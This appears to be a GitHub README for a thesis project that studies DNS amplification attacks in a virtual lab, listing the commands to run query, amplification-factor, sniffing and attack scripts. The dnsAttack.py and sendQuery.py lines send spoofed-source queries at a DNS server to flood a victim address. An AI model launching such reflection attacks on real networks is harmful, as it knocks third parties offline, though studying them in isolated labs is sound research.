# Development and Study of a DNS Amplification Attack in a Virtual Environment

The aim of this project was to implement the scripts on this Github repository in order to study the DNS Amplification attack in a controlled virtual environment. You will find various scripts within this project.

## DNS Query Script for Amplification Rate Calculation: sendQuery.py

To launch this script, simply run the following command from the folder containing the entire project on the attacker machine.

Without DNSSEC:
```bash
sudo python3.9 attack/sendQuery.py -s <victimAddress> -d 192.168.68.53 -q amaury.thesis.io -t 60
```
With DNSSEC:
```bash
sudo python3.9 attack/sendQuery.py -s <victimAddress> -d 192.168.68.53 -q amaury.thesis.io -t 60 --dnssec
```

## DNS Server Amplification Rate Calculation Script: calculateAF.py

To launch this script, simply run the following command from the folder containing the entire project on the server machine.

Without DNSSEC:
```bash
sudo python3 server/calculateAF.py -s <victimAddress> -d 192.168.68.53 -q amaury.thesis.io
```
With DNSSEC:
Without DNSSEC:
```bash
sudo python3 server/calculateAF.py -s <victimAddress> -d 192.168.68.53 -q amaury.thesis.io --dnssec
```

## DNS Traffic Sniffing Script: viewTraffic.py

To launch this script, simply run the following command from the folder containing the entire project on the victim machine.

Without DNSSEC:
```bash
sudo python3 victim/viewTraffic.py
```
With DNSSEC:
```bash
sudo python3 victim/viewTraffic.py --dnssec
```

## DNS Amplification Attack Script: dnsAttack.py

To launch this script, simply run the following command from the folder containing the entire project on the attacker machine.

Without DNSSEC:
```bash
sudo python3.9 attack/dnsAttack.py -s <victimAddress> -d 192.168.68.53 -q amaury.thesis.io -t 60 -n <Number of process>
```
With DNSSEC:
```bash
sudo python3.9 attack/dnsAttack.py -s <victimAddress> -d 192.168.68.53 -q amaury.thesis.io -t 60 -n <Number of process> --dnssec
```
